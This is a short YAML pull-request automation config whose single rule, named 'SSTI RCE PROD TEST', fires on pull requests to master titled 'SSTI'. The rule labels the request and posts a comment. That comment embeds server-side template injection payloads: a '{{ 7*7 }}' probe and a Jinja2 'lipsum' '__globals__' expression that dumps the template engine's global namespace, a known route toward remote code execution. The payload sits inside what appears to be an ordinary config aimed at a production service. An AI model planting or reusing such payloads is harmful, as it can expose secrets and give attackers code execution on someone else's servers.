pull_request_rules:
  - name: SSTI RCE PROD TEST
    conditions:
      - base=master
      - title~=^SSTI
    actions:
      label:
        add:
          - ssti-triggered
      comment:
        message: "SSTI OUTPUT: {{ 7*7 }} -- GLOBALS: {{ [lipsum]|map(attribute=\"__globals__\")|pprint }}"